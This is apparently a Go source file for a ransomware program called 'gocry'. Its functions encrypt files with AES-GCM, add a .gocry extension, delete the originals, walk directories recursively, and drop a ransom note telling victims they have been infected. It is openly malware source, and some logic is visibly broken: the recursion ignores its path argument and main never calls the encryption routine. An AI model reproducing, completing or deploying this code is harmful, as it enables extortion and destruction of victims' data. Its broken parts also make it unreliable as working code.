package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"io"
	"io/ioutil"
	"log"
	"os"

	"github.com/joho/godotenv"
	"github.com/nireo/gocry/utils"
	"golang.org/x/exp/errors/fmt"
)

const message string = `
Hello, you've been infected by gocry. Your files have been encrypted using military grade encryption >:D.
Do not use any decryption software or change the files, otherwise they might be lost forever.

How to decrypt:
`

// Ransomware holds all the values and functions needed to operate the ransomware.
type Ransomware struct {
	key       []byte
	publicKey string
	rootDir   string
	publicIP  string
}

// GenNewKey creates a random 32-bit key using the std crypto library.
func (rw *Ransomware) GenNewKey() error {
	key, err := utils.Gen32BitKey()
	if err != nil {
		log.Fatal(err)
	}

	rw.key = key
	return nil
}

// encrypts a file at a given path using the given ransomware key. also adds the .gocry extension
func (rw *Ransomware) encryptSingleFile(path string) {
	data, err := ioutil.ReadFile(path)
	if err != nil {
		log.Fatal(err)
	}

	block, _ := aes.NewCipher(rw.key)
	gcm, err := cipher.NewGCM(block)

	if err != nil {
		log.Fatal(err.Error())
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		log.Fatal(err.Error())
	}

	if err := ioutil.WriteFile(path+".gocry", gcm.Seal(nonce, nonce, data, nil), 0666); err != nil {
		log.Fatal(err)
	}

	if err := os.Remove(path); err != nil {
		log.Fatal(err)
	}
}

func (rw *Ransomware) decryptSingleFile(path string) {
	data, err := ioutil.ReadFile(path)
	if err != nil {
		log.Fatal(err)
	}

	block, err := aes.NewCipher(rw.key)
	if err != nil {
		log.Fatal(err.Error())
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		log.Fatal(err.Error())
	}

	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		log.Fatal(err.Error())
	}

	// path[:len(path)-6] removes the .gocry extension from the filename -> test.png.gocry -> test.png
	if err := ioutil.WriteFile(path[:len(path)-6], plaintext, 0666); err != nil {
		log.Fatal(err)
	}

	if err := os.Remove(path); err != nil {
		log.Fatal(err)
	}
}

// This function is used recursively to encrypt all the subdirectories, and the files
// in those directores
func (rw *Ransomware) encryptDirectory(path string) {
	files, err := ioutil.ReadDir(rw.rootDir)
	if err != nil {
		log.Fatal(err)
	}

	for _, f := range files {
		if f.IsDir() {
			rw.encryptDirectory(path + "/" + f.Name())
		} else {
			rw.encryptSingleFile(path + "/" + f.Name())
		}
	}
}

// This function is used recursively to decrypt all the subdirectories, and the files
// in those directores
func (rw *Ransomware) decryptDirectory(path string) {
	files, err := ioutil.ReadDir(rw.rootDir)
	if err != nil {
		log.Fatal(err)
	}

	for _, f := range files {
		if f.IsDir() {
			rw.decryptDirectory(path + "/" + f.Name())
		} else {
			rw.decryptSingleFile(path + "/" + f.Name())
		}
	}
}

func main() {
	if err := godotenv.Load(); err != nil {
		log.Fatal(err)
	}

	ransomware := &Ransomware{}
	ransomware.GenNewKey()
	ransomware.rootDir = os.Getenv("root_dir")

	// Create the message file
	file, err := os.Create(ransomware.rootDir + "/ransom.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	if _, err := file.WriteString(message); err != nil {
		log.Fatal(err)
	}

	fmt.Println(string(ransomware.key))
}
